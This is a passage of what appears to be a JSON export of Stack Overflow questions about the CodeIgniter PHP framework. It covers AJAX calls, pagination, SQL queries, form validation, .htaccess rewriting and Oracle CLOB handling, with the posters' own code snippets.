part is not working?","body":"<p>I'm using codeigniter framework with ajax and jquery </p>\n\n<p>This my ajax code</p>\n\n<pre><code>$('#email').blur(function(){\n    var email=$(\"#email\").val();    \n\n    $.ajax({\n        url: \"http://localhost/paymybill/ajax/email_check\",\n        global: false,\n        type: \"POST\",\n        data: email,\n        success: function(data) {\n           alert('working ......');\n           alert(data);\n        }\n\n    });\n});\n</code></pre>\n\n<p>This my controller code  </p>\n\n<pre><code>public function email_check(){\n\n    echo \"xxxxx\";\n    return;\n}\n</code></pre>\n\n<p>problem is that it don't alert message in \"success:\" part of ajax code please help me\n ( if i will do any error in the controller both the messages are displaying but second message  with the error message ) please help me i m new to ajax </p>\n"},{"tags":["codeigniter","rest","backbone.js"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":499,"score":0,"question_id":11292968,"title":"Backbone JS and CodeIgniter REST Server","body":"<p>I have a standard CI web app, but I've decided to get the chaotic javascript in order using backbone. I had a whole pile of serialized forms/jQuery AJAX requests to various controller methods:  authenticate, change_password, register_member, request_new_password, etc.., and don't quite understand how REST works instead. I'm using Phil Sturgeon's REST library for CI <a href=\"https://github.com/philsturgeon/codeigniter-restserver\" rel=\"nofollow\">https://github.com/philsturgeon/codeigniter-restserver</a></p>\n\n<p>Should every backbone model have a different api url? And what am I supposed to actually call the controller methods?</p>\n\n<pre><code>&lt;?php  \n    require(APPPATH.'/libraries/REST_Controller.php');  \n    class RestApi extends REST_Controller  \n    {  \n        function get()  \n        {  \n</code></pre>\n\n<p>But it just 404s. </p>\n\n<p>I just don't get how to replace the routing to fifty of my old methods based on a handful of HTTP methods. Does the name of the backbone model need to match something on the server side?</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":274,"score":0,"question_id":7945890,"title":"Displaying serial numbers with query result","body":"<p>I am trying to fetch data from my database and when I display it I want to show serial numbers (Just like a list) , example:</p>\n\n<pre><code> **Serial Number**      Name          Country\n     1.               John             USA\n     2.              Srijon            UK\n</code></pre>\n\n<p>I have tried something with PHP Loops, but I couldn't make it work. Would you please kindly help me? please note that by serial numbers I don't mean values retrieved from database. </p>\n\n<p>Thanks in Advance :)</p>\n\n<p>Here's my Model</p>\n\n<pre><code> //Function To Create All Batch List\n  function batch_list($perPage,$uri) { \n    $this-&gt;db-&gt;select('*');\n    $this-&gt;db-&gt;from('batch');\n        $this-&gt;db-&gt;join('teacher', 'batch.batchinstructor = teacher.teacherid');\n    $this-&gt;db-&gt;order_by('batchid','DESC');\n    $getData = $this-&gt;db-&gt;get('', $perPage, $uri);\n    if($getData-&gt;num_rows() &gt; 0)\n    return $getData-&gt;result_array();\n    else\n    return null;\n    }\n //End of Function To Create All Batch List\n</code></pre>\n\n<p>Here's mY Controller</p>\n\n<pre><code> function index(){\n$this-&gt;load-&gt;library('pagination');\n$config['base_url'] = base_url().'batchlist/index';\n$config['total_rows'] = $this-&gt;db-&gt;get('batch')-&gt;num_rows();\n$config['per_page'] = 20;\n$config['num_links'] = 20;\n$config['full_tag_open'] = '&lt;div class=\"pagination\" align=\"center\"&gt;';\n$config['full_tag_close'] = '&lt;/div&gt;';\n\n$this-&gt;pagination-&gt;initialize($config);\n$this-&gt;load-&gt;model('mod_batchlist');\n$data['records']= $this-&gt;mod_batchlist-&gt;batch_list($config['per_page']\n                      ,$this-&gt;uri-&gt;segment(3));\n    $data['main_content']='view_batchlist';\n$this-&gt;load-&gt;view('includes/template',$data);\n\n}\n</code></pre>\n\n<p>Here's My View</p>\n\n<pre><code> &lt;?php if(count($records) &gt; 0) { ?&gt;\n &lt;table id=\"table1\" class=\"gtable sortable\"&gt;\n&lt;thead&gt;\n&lt;tr&gt;\n    &lt;th&gt;Batch Name&lt;/th&gt;\n    &lt;th&gt;Class&lt;/th&gt;\n    &lt;th&gt;Batch Instructor&lt;/th&gt;\n    &lt;th&gt;Edit/Delete&lt;/th&gt;\n&lt;/tr&gt;\n&lt;/thead&gt;\n\n&lt;tbody&gt;\n    &lt;?php foreach ($records as $row){ ?&gt;\n&lt;tr&gt;\n    &lt;td&gt;&lt;a href=\"&lt;?php echo base_url(); ?&gt;batch/&lt;?php echo $row['batchid']; ?&gt;\"&gt;&lt;?php echo $row['batchname'];?&gt;     &lt;/a&gt;&lt;/td&gt;\n    &lt;td&gt;&lt;?php echo $row['class'];?&gt;&lt;/td&gt;\n    &lt;td&gt;&lt;?php echo $row['teachername'];?&gt;&lt;/td&gt;\n    &lt;td&gt; &lt;a href=\"&lt;?php echo base_url(); ?&gt;updatebatch/get/&lt;?php echo $row['batchid']; ?&gt;\" title=\"Edit\"&gt;&lt;img  src=\"&lt;?php echo base_url(); ?&gt;                                                            support/images/icons/edit.png\" alt=\"Edit\" /&gt;&lt;/a&gt;\n    &lt;a href=\"#\" title=\"Delete\"&gt;&lt;img src=\"&lt;?php echo base_url();  ?&gt;support/images/icons/cross.png\" alt=\"Delete\" /&gt;&lt;/a&gt;\n    &lt;/td&gt;\n &lt;/tr&gt;\n            &lt;?php  } ?&gt;\n\n &lt;/tbody&gt;\n &lt;/table&gt;\n  &lt;?php } ?&gt;\n   &lt;div class=\"tablefooter clearfix\"&gt;\n&lt;div class=\"pagination\"&gt;\n&lt;?php echo $this-&gt;pagination-&gt;create_links(); ?&gt; \n&lt;/div&gt;\n\n &lt;/div&gt;\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":568,"score":0,"question_id":2585575,"title":"Is it possible to return multiple variables/arrays in Codeigniter?","body":"<p>Let's say in my model, I have a function that queries two separate tables. I need to pass the results back to my controller to display in my view.</p>\n\n<p>I'm using MongoDB but it should be the same for any other DB. Normally this would work.</p>\n\n<pre><code>$files = $grid-&gt;find(array(\"username\" =&gt; $profile_id, \n                     \"thumbnail\" =&gt; array('$ne' =&gt; true)) );\n\n$return files;\n</code></pre>\n\n<p>But, I need to go a step further and check to see if the user has a default photo selected.</p>\n\n<pre><code>$getCount = $grid-&gt;count(array(\"username\" =&gt; $profile_id, \n                     \"default\" =&gt; array('$ne' =&gt; true)) );\n</code></pre>\n\n<p>If I recall correctly, I would normally do ...</p>\n\n<pre><code>$return array($files, $getCount);\n</code></pre>\n\n<p>Doesn't work though.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12900365,"title":"Limiting the result returned","body":"<p>Controller </p>\n\n<pre><code>elseif($type == 'high'){\n        //Get Urgent Projects\n        $this-&gt;session-&gt;set_userdata('show_num','5');\n        $page_rows = $this-&gt;session-&gt;userdata('show_num');\n\n\n        $urgent_conditions = array('projects.project_status' =&gt; '0','budget_max &gt;=' =&gt; '10');\n        $order = array('budget_max','DESC');\n        $this-&gt;outputData['listProjects']   = $this-&gt;skills_model-&gt;getProjects($urgent_conditions,NULL,NULL,NULL,$order);\n        $this-&gt;outputData['title'] = 'High Budget Projects';\n        $this-&gt;outputData['viewall'] = 'high_budget';\n    }\n    $this-&gt;load-&gt;view('listProjects',$this-&gt;outputData);\n</code></pre>\n\n<p>Model</p>\n\n<pre><code> function getProjects($conditions=array(),$fields='',$like=array(),$limit=array(),$orderby = array())\n {\n    //Check For Conditions\n    if(is_array($conditions) and count($conditions)&gt;0)      \n        $this-&gt;db-&gt;where($conditions);\n\n    //Check For like statement\n    if(is_array($like) and count($like)&gt;0)      \n        $this-&gt;db-&gt;like($like); \n\n    //Check For Limit   \n    if(is_array($limit))        \n    {\n        if(count($limit)==1)\n            $this-&gt;db-&gt;limit($limit[0]);\n        else if(count($limit)==2)\n            $this-&gt;db-&gt;limit($limit[0],$limit[1]);\n    }   \n    //pr($orderby);\n    //Check for Order by\n    if(is_array($orderby) and count($orderby)&gt;0)\n        $this-&gt;db-&gt;order_by($orderby[0], $orderby[1]);\n\n    $this-&gt;db-&gt;from('projects');\n    $this-&gt;db-&gt;join('users', 'users.id = projects.creator_id','left');\n    //Check For Fields   \n    if($fields!='')\n            $this-&gt;db-&gt;select($fields);\n    else        \n        $this-&gt;db-&gt;select('projects.id,projects.project_name,projects.project_status,projects.description,projects.budget_min,projects.budget_max,projects.project_categories,projects.creator_id,projects.is_feature,projects.is_urgent,projects.is_hide_bids,projects.created,projects.attachment_name,projects.attachment_url,users.user_name,projects.enddate,projects.programmer_id,projects.project_award_date,projects.project_award_date,projects.contact,projects.salary,projects.flag,projects.escrow_due,users.id as userid,projects.checkstamp,projects.provider_rated,projects.buyer_rated,projects.project_paid,projects.is_private,projects.private_users,users.user_rating,users.num_reviews,users.email'); \n    $result =$this-&gt;db-&gt;get();\n\n    return $result;\n\n }//End of getProjects Function\n</code></pre>\n\n<p>The problem i'm facing is not being able to limit the amount of result returned because for this \"HIGH\" $type , there isnt any setting build in. For the other $type there is a setting at admin panel with a number of how many to return. Is there anyway i can insert a LIMIT number here to force it to return a fix amount of result? </p>\n"},{"tags":["php","codeigniter","templates"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12814033,"title":"template library codeigniter","body":"<p>I have designed a template using the template library of codeigniter, the template has the following regions:</p>\n\n<pre><code>$template['template_ar']['template'] = 'template_ar';\n$template['template_ar']['regions'] = array(\n  'header',\n  'title',\n  'content',\n  'topcontent',\n  'sidebar',\n  'footer',\n  'options',\n  'script',\n);\n</code></pre>\n\n<p>I used the following code to render my template</p>\n\n<pre><code>class faq extends MY_Controller {\n  /** \n  * Index\n  * This function views the Home Page\n  * \n  * @access  public\n  * @return  \n  */\n\n  public function index() {\n    $this-&gt;template-&gt;write_view('content','comment/questions');   \n    $this-&gt;template-&gt;write('options','You one',TRUE);      \n    $this-&gt;template-&gt;render();\n  }\n}\n</code></pre>\n\n<p>The problem that I want to eliminate is that I want to prevent the top content from appearing in my template. I need only the content, the header and the footer. Can anyone tell me how to do this?</p>\n"},{"tags":["php","codeigniter","translation","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12901172,"title":"CodeIgniter: Parse dynamic language captions located in javascript","body":"<p>I have a javascript code that needs localisation, ie.</p>\n\n<pre><code>function js_proc() {\n    var some_data = 'this text needs to be translated dynamically at runtime';\n}\n</code></pre>\n\n<p>So I re-wrote like this:</p>\n\n<pre><code>function js_proc() {\n    var some_data = &lt;?php echo $this-&gt;lang-&gt;line('some_data_id'); ?&gt;;\n}\n</code></pre>\n\n<p>In the view, I wrote the js link like this:</p>\n\n<pre><code>&lt;script type=\"text/javascript\" src=\"www.domain.com/codeigniter/get_js/file-1/\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>which calls the function get_js() in the controller. The idea is to have the get_js() function read the js file(s) and translate the language strings...</p>\n\n<p>There are way too many js strings to be translated, so I can't pass <code>every string</code> as a variable. Ideally I'd like to make this work through the codeigniter language files.</p>\n\n<p><strong>My question is: is there a way to parse the php parts in the js file &amp; executed (=translate) them?</strong> ie.</p>\n\n<pre><code>class App extends CI_Controller\n{\n    function get_js {\n        $content = file_get_contents($js_file);\n        echo parse_php($content);\n    }\n    ...\n}\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["codeigniter","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1512,"score":0,"question_id":4060595,"title":"Using DX Auth for Codeigniter","body":"<p>Has anyone used DX Auth for Codeigniter bundeled examples?</p>\n\n<p>After following Installing DX Auth library with bundled examples on <a href=\"http://dexcell.shinsengumiteam.com/dx_auth/installation/index.html\" rel=\"nofollow\">http://dexcell.shinsengumiteam.com/dx_auth/installation/index.html</a> </p>\n\n<p>I added a route $route['auth'] = \"auth\"; in config/routes.php, uploaded /controllers/auth.php, added $autoload['libraries'] = array('database', 'session', 'xmlrpc', 'DX_Auth'); in /config/autoload.php.</p>\n\n<p>The bundled example comes with the views in a subfolder /views/auth.\nI tried to put the register_form.php view in both /views and /views/auth.</p>\n\n<p>Once I enter <a href=\"http://mydomain.com/auth/register\" rel=\"nofollow\">http://mydomain.com/auth/register</a> I get a blank page, like no view is loading.\nAn help would be greatly appreciated.</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12884277,"title":"How to get parent and child category items count?","body":"<p>I am basically trying to make a category list which will have an array of categories and its subcategories. </p>\n\n<p>My current query is:</p>\n\n<pre><code>SELECT category.lc_name AS name,COUNT(listings.ls_cat_id) AS post_count\nFROM listings_categories AS category\nLEFT JOIN listings ON listings.ls_cat_id = category.lc_id \nGROUP BY category.lc_id ORDER BY name ASC\n</code></pre>\n\n<p>It works pretty well however i want the subcategories items or posts count to be added to its parent category.</p>\n\n<p>For example:</p>\n\n<pre><code>id | category | parent | Count\n1      Auto        0       3\n2      Auto A      1       1\n3      Auto B      1       1\n4      Auto C      1       1\n</code></pre>\n\n<p>What can i do this in mysql using only one query?</p>\n\n<p>The Table Structure</p>\n\n<pre><code>listings - ls_id,ls_cat_id,ls_title\nlistings_categories - lc_id,lc_parent,lc_name\n</code></pre>\n"},{"tags":["jquery","codeigniter","jqgrid"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":3311,"score":1,"question_id":1945041,"title":"CodeIgniter with Jqgrid","body":"<p>I've been working on jqGrid for the last 3 days.</p>\n\n<p>I've been able to populate the grid, but now  I can't get to work the buttons/features of the jqGrid like add, edit, save or even delete a row.</p>\n\n<p>Any suggestion/opinions on how to do this will be really helpful.</p>\n\n<p>btw- I'm using codeigniter with jqGrid</p>\n\n<p>this is my js file</p>\n\n<pre><code>$(\"#listFlex\").jqGrid({\n    url: root + mod + '/listview2',\n    datatype: \"json\",\n    colNames:['','role_code','role_description'],\n    colModel:[\n        {name:'role_id',index:'role_id', width:50, align:\"center\",hidden:true},\n        {name:'role_code',index:'role_code', width:80},\n        {name:'role_desc',index:'role_desc', width:100,align:\"left\"}\n    ],\n    buttons : [\n        {name: $.i18n._(action_lang,'delete'), bclass: 'delete', onpress: df_delete_1},\n        {separator: true}\n    ],\n    rowNum:10,\n    rowList:[10,20,30],\n    pager: '#pager2',\n    sortname: 'role_id',\n    viewrecords: true,\n    sortorder: \"desc\",\n    onSelectRow: function(id){\n        if(id &amp;&amp; id!==lastsel){\n            jQuery('#listFlex').jqGrid('restoreRow',lastsel);\n            jQuery('#listFlex').jqGrid('editRow',id,true);\n            lastsel=id;\n        }\n    },\n    autowidth: true,\n    height: \"200\",\n    viewrecords: true,\n    sortorder: \"desc\",\n    caption:\"JSON Example\",\n    editurl:\"sec_role/post\"\n});\n\njQuery(\"#listFlex\").jqGrid('navGrid','#pager2',{edit:true,add:true,del:true});\n\n//edit data\n$(\"#bedata\").click(function(){\n    var gr = jQuery(\"#listFlex\").jqGrid('getGridParam','selrow');\n    if( gr != null )\n        jQuery(\"#listFlex\").jqGrid('editGridRow',gr,{height:280,reloadAfterSubmit:false});\n    else\n        alert(\"Please Select Row\");\n});\n\n$(\"#dedata\").click(function(){\n    var gr = jQuery(\"#listFlex\").jqGrid('getGridParam','selrow');\n    if( gr != null )\n        jQuery(\"#listFlex\").jqGrid('delGridRow',gr,{reloadAfterSubmit:false});\n    else\n        alert(\"Please Select Row to delete!\");\n});\n</code></pre>\n\n<p>view file</p>\n\n<pre><code>&lt;table id=\"listFlex\" class=\"listFlex\" cellpadding=\"0\" cellspacing=\"0\"&gt;&lt;/table&gt;\n&lt;div id=\"pager2\" class=\"scroll\" style=\"text-align: center;\"&gt;&lt;/div&gt;\n&lt;input type=\"BUTTON\" id=\"bedata\" value=\"Edit Selected\" /&gt; &lt;!--edit--&gt;\n&lt;input type=\"BUTTON\" id=\"dedata\" value=\"Delete Selected\" /&gt;&lt;!-- add--&gt;\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":12888385,"title":"CodeIgniter Sql syntax not working","body":"<p>Okay here i am, be direct i need some advice</p>\n\n<p>so here i have some code igniter problem with \"Database\", this is the code</p>\n\n<pre><code>    $as=\"&amp;amp;\";\n    $string1=\"title=\";\n    $a= $this-&gt;input-&gt;post('title');\n    $string2=\"category=\";\n    $b= $this-&gt;input-&gt;post('category');\n    $string3=\"length_comparison=\";\n    $c= $this-&gt;input-&gt;post('length_comparison');\n    $string4=\"length=\";\n    $d= $this-&gt;input-&gt;post('length');\n\n\n    $combine=$string1.$a.$as.$string2.$b.$as.$string3.$c.$as.$string4.$d;\n\n\n    $this-&gt;db-&gt;select('*');\n    $this-&gt;db-&gt;from('ci_query');\n    $this-&gt;db-&gt;where('ci_query.query_string',$combine);             \n    $query = $this-&gt;db-&gt;get();\n    $rows=$query-&gt;result();\n    $count=0;\n\n    foreach($rows as $row)\n    {\n        $count=$count+1;\n        $query_id = $row-&gt;id;\n    }\n\n    if($count==0)\n    {\n        $query_id = $this-&gt;input-&gt;save_query($query_array);\n    }\n\n\n    redirect(\"films/display/$query_id\");\n</code></pre>\n\n<p>Here is the logic</p>\n\n<pre><code> 1. i got an input from a search form  tittle,category,length_comparison,and length.\n 2. first case these logic will save all those input into a column in a table, all in 1 column, if there is no same parameter\n\"tittle,category,length_comparison,and length\" in the table.\n 3. but if there is any same parameter it will not insert to the table, and just redirect to the page i choose\n 4. from the table we got the id and display instead of using long query string. display the search result.\n</code></pre>\n\n<p>My problem :\ni've done the coding and it's work perfectly in my computer/pc. but when i use my laptop it's just doesn't work, anyone can give me some advice ? or my coding? or ci version? or what?</p>\n\n<p>Update : </p>\n\n<p>i think that is not the problem since i've override the lib, so i have this to use that function   </p>\n\n<p>\n\n<pre><code>function save_query($query_array) {\n\n    $CI =&amp; get_instance();\n\n    $CI-&gt;db-&gt;insert('search', array('query_string' =&gt; http_build_query($query_array)));\n\n    return $CI-&gt;db-&gt;insert_id();\n}\n\nfunction load_query($query_id) {\n\n    $CI =&amp; get_instance();\n\n    $rows = $CI-&gt;db-&gt;get_where('search', array('id' =&gt; $query_id))-&gt;result();\n    if (isset($rows[0])) {\n        parse_str($rows[0]-&gt;query_string, $_GET);       \n    }\n\n}\n</code></pre>\n\n<p>}</p>\n"},{"tags":["php","validation","codeigniter","file-upload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12903659,"title":"CodeIgniter form validation does not recognise $_FILES","body":"<p>Im using a custom form validator function to check if an image type file is being uploaded. Its quite simple, but no matter what I try I cant seem to get the validator to pass the variable correctly.</p>\n\n<p><strong>HTML</strong></p>\n\n<pre><code>&lt;input type=\"file\" name=\"image\" /&gt;&lt;div&gt;&lt;?php echo form_error('image'); ?&gt;&lt;/div&gt;\n</code></pre>\n\n<p><strong>CONTROLLER</strong></p>\n\n<pre><code>public function postAd(){\n    $this-&gt;form_validation-&gt;set_rules(\"image\", \"image\", \"callback_valid_image\");\n\n     if ($this-&gt;form_validation-&gt;run()==FALSE){\n            $this-&gt;load-&gt;view('header', array('title'=&gt;\"Post an ad\"));\n            $this-&gt;load-&gt;view('ads/default');\n            $this-&gt;load-&gt;view('footer');\n        }else{\n            echo \"EMPTY\";\n        }\n}\n\npublic function valid_image($file){\n     echo \"RAW:\" . $file . \"&lt;br /&gt;\";\n     echo \"FILE:\",$_FILES[$file];\n}\n</code></pre>\n\n<p>I have set up the messages in the form_validation language file too.</p>\n\n<p>Regardless of what type of file I enter, or if I leave it blank, it will never show any file at echo \"RAW\" or echo \"FILE\" lines.</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12904308,"title":"Update query increment field plus 1 codeigniter","body":"<p>I got a problem when trying to increment by 1 on given field in my db. I tried with and without active records.</p>\n\n<p>My functions look like this (in my model)</p>\n\n<pre><code>function _set_reads($id){\n$this-&gt;db-&gt;set('reads', 'reads+1', FALSE)\n$this-&gt;db-&gt;where('id', $id);\n$this-&gt;db-&gt;update('article');\n}\n</code></pre>\n\n<p>and</p>\n\n<pre><code>function _set_reads($id){\n$sql = 'update article set reads=reads+1 where id=?';\n$this-&gt;db-&gt;query($sql, array($id));\n}\n</code></pre>\n\n<p>I get the same error in both cases and it's the following error message:</p>\n\n<pre><code>Error Number: 1064\n\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'reads+1 WHERE `id` = '15'' at line 1\n\nUPDATE `article` SET `reads` = reads+1 WHERE `id` = '15'\n</code></pre>\n\n<p>I am using the latest version of MAMP </p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12902362,"title":"MySQL JOIN vs PHP foreach loop","body":"<p>I'm having a problem optimizing a MySQL Query, but so far it takes too long to pull a simple result limited to 500 records. </p>\n\n<p>My query is this:</p>\n\n<pre><code>SELECT ou.*, gr.accepted, gr.value \nFROM offer_usermeta ou \nLEFT JOIN gateway_requests AS gr ON ou.customer_id = gr.customer_id \nWHERE ou.customer_id != \"\" \nAND ou.created &gt;= '2012-10-08 00:00:00' \nAND ou.created &lt;= '2012-10-08 23:59:59' \nORDER BY ou.created DESC LIMIT 500\n</code></pre>\n\n<p>This query is taking an entire minute to iterate over maybe 40,000 records. I need it to pull in gateway responses based on the customer ID if there are any and the data looks correct with this query, but I need tips on optimizing. I was considering just pulling the data in separately and foreach'ing it together as necessary, but I know that's probably going to be far slower... </p>\n\n<p>Any tips? (I'm using codeigniter if anyone knows a fancy trick in there as well)</p>\n"},{"tags":["php","codeigniter","form-validation"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12864233,"title":"How do I echo a form error in a else statement in my controller in code-igniter?","body":"<p>I have all of the different combinations of submitting a incorrect form for my login form in code-igniter working as they should.</p>\n\n<p>**EDIT - This seems like the most logical formation as the other suggestions were loading double views and or not cohesive with my structure. All of the errors work properly except one.</p>\n\n<p>When you hit submit with CORRECT email and gibberish password, no error appears and the page reloads with the entered email auto filled and the password field set back to the defaulted \"PASSWORD\" text.</p>\n\n<p>I have been stuck on this far too and long and any help would be greatly appreciated.</p>\n\n<pre><code>function validate_credentials_login()\n    {\n        $this-&gt;load-&gt;library('session');\n        $this-&gt;load-&gt;helper(array('form','url'));\n        $this-&gt;load-&gt;model('user_model', 'um');\n        $this-&gt;load-&gt;library('encrypt');\n        $this-&gt;load-&gt;library('form_validation');\n\n\n        $this-&gt;form_validation-&gt;set_rules('email_login', 'Email', 'trim|required|valid_email'); \n        $this-&gt;form_validation-&gt;set_rules('password_login', 'Password', 'trim|required');\n\n\n        if ( $this-&gt;form_validation-&gt;run() === TRUE ) \n        {   \n            $user = $this-&gt;um-&gt;validate_home_login(array('email' =&gt; $this-&gt;input-&gt;post('email_login')));\n\n            if ( $user )\n            {\n                if ( $user-&gt;password == $this-&gt;encrypt-&gt;sha1( $user-&gt;salt .         $this-&gt;encrypt-&gt;sha1($this-&gt;input-&gt;post('password_login'))) &amp;&amp; $user-&gt;email == $this-&gt;input-&gt;post('email_login') ) \n                {\n                    $this-&gt;session-&gt;set_userdata(array('email' =&gt; $this-&gt;input-&gt;post('email_login')));\n                    redirect('account/edit');\n                }\n                else\n                {\n                   $this-&gt;form_validation-&gt;run() == FALSE;\n                }\n            }\n            else\n            {\n                $this-&gt;form_validation-&gt;run() == FALSE;\n            }\n        }\n\n  $data['main_content'] = 'home/home_page';\n  $this-&gt;load-&gt;view('includes/templates/home_page_template', $data);   \n\n    } \n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12904034,"title":"Web service json parameters","body":"<p>I made a web service in Codeigniter With restful and I test it with Pastman (A plugging for chrome like cUrl) all work fine.</p>\n\n<p>I call the service with form-data parameters.</p>\n\n<p>Now, A iOS developer is triying to use the Web Services and he is getting an error: Invalid parameters.\nI see the web service log an the parameters are fine.</p>\n\n<p>It is posible that the web service dosn't work because can't read the parameters in the json format, but it can read the form-data format?</p>\n"},{"tags":["php","codeigniter","dll","com"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12901780,"title":"Persis objects in CodeIgniter","body":"<p>I have an php object which I want to be accessible whenever I want. I want to create this object once and keep it persisten so that I dont have to reload it again. And also I would like this object to be accessible in my controllers/models ets..</p>\n\n<p>Can this be achieved in CodeIgniter/PHP without using session?</p>\n\n<p>Or maybe ussing seesion, but will I be able to access its methods? </p>\n\n<p>This object is created using PHP COM library from my dll file</p>\n\n<p>Here is sample of my object:</p>\n\n<pre><code> $myDllObject = new COM(\"MyDLL.MyCLass\");\n</code></pre>\n"},{"tags":[".htaccess","codeigniter","mod-rewrite","website"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12673496,"title":"Codeigniter htaccess index.php site down","body":"<p>Codeigniter htaccess started problem suddenly even when no changes were made to any files. I can access</p>\n\n<ul>\n<li>www.mysite.com/index.php/controller/method</li>\n</ul>\n\n<p>but when I access </p>\n\n<ul>\n<li>www.mysite.com/controller/method</li>\n</ul>\n\n<p>it gives a general 404, not a codeigniter 404. Any help is appreciated. The site is down.</p>\n\n<p>Here is my present htaccess</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\n\n #Removes access to the system folder by users.\n #Additionally this will allow you to create a System.php controller,\n #previously this would not have been possible.\n #'system' can be replaced if you have renamed your system folder.\n RewriteCond %{REQUEST_URI} ^system.*\n RewriteRule ^(.*)$ /index.php/$1 [L]\n\n #Checks to see if the user is attempting to access a valid file,\n #such as an image or css document, if this isn't true it sends the\n #request to index.php\n RewriteCond %{REQUEST_FILENAME} !-f\n RewriteCond %{REQUEST_FILENAME} !-d\n #This last condition enables access to the images and css folders, and the robots.txt file \n#Submitted by Michael Radlmaier (mradlmaier)\n RewriteCond $1 !^(index\\.php|images|robots\\.txt|css)\n RewriteRule ^(.*)$ index.php/$1 [L]\n &lt;/IfModule&gt;\n\n &lt;IfModule !mod_rewrite.c&gt;\n # If we don't have mod_rewrite installed, all 404's\n # can be sent to index.php, and everything works as normal.\n # Submitted by: ElliotHaughin\n\n ErrorDocument 404 /index.php\n &lt;/IfModule&gt; \n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12821275,"title":"Codeigniter: can't get the value passed in uri segment","body":"<p>I am currently having an issue getting the value of a uri segment.</p>\n\n<p>Here's the scenario.</p>\n\n<p>when the user clicks this anchor:</p>\n\n<pre><code>&lt;?php echo anchor(\"site/comment/$row-&gt;post_id\", \"Comment\"); ?&gt;\n</code></pre>\n\n<p>the link in the address bar of the browser becomes:</p>\n\n<pre><code>http://localhost/CI_TEST/index.php/site/comment/140838624\n</code></pre>\n\n<p>As you can see there really is a value on the third segment of the link.\nNow, when I try to get that value in my query like this:</p>\n\n<pre><code>$comment_data = array(\n        'post_id' =&gt; $this-&gt;uri-&gt;segment(3),\n        'date_commented' =&gt; date('Y-m-d H:i:s'),            \n        );\n</code></pre>\n\n<p>and send it on the database, the value that is saved is zero when supposedly, it should be 140838624.</p>\n\n<p>Any ideas? What am I missing here?</p>\n"},{"tags":["php","codeigniter","oracle11g","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":198,"score":2,"question_id":10186506,"title":"error clob (oracle) value in code igniter, how to solve it?","body":"<p>i have data in my oracle and retrieve it from codeigniter</p>\n\n<pre><code>$this-&gt;db-&gt;select('detail');\n$r = $this-&gt;db-&gt;get($tableName);\n$result = $r-&gt;result();\n</code></pre>\n\n<p>print_r($result) :</p>\n\n<pre><code>Array\n(\n    [0] =&gt; stdClass Object\n        (\n            [DETAIL] =&gt; OCI-Lob Object\n                (\n                    [descriptor] =&gt; Resource id #80\n                )\n        )\n\n    [1] =&gt; stdClass Object\n        (\n            [DETAIL] =&gt;\n        )\n\n    [2] =&gt; stdClass Object\n        (\n            [DETAIL] =&gt; OCI-Lob Object\n                (\n                    [descriptor] =&gt; Resource id #80\n                )\n        )\n)\n</code></pre>\n\n<p>data model :</p>\n\n<pre><code>function get_ora_blob_value($value)\n{\n    $size = $value-&gt;size();\n    $result = $value-&gt;read($size);\n    return ($result)?$result:NULL;\n}\n</code></pre>\n\n<p>retrieving data :</p>\n\n<pre><code>echo $this-&gt;data-&gt;get_ora_blob_value($result[0][DETAIL]); // should be 'remark1'\necho \"&lt;br /&gt;\";\necho $this-&gt;data-&gt;get_ora_blob_value($result[1][DETAIL]); // should be null\necho \"&lt;br /&gt;\";\necho $this-&gt;data-&gt;get_ora_blob_value($result[2][DETAIL]); // should be 'remark2'\n</code></pre>\n\n<p>printed :</p>\n\n<pre><code>remark2 \n(empty) \n(empty)\n</code></pre>\n\n<p>why first data has value of third data? and third data become empty?</p>\n"},{"tags":["forms","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12900479,"title":"CodeIgniter - Adding a class to options in a dropdown","body":"<p>I am using jQuery.chained so that when you select a Country from a drop down it filters a Province/State dropdown. However it requires that each <code>&lt;option&gt;</code> have a class name with the corresponding country.</p>\n\n<p>This is what I have so far</p>\n\n<pre><code>$options = array(\n    //Canada\n    \"AB\" =&gt; 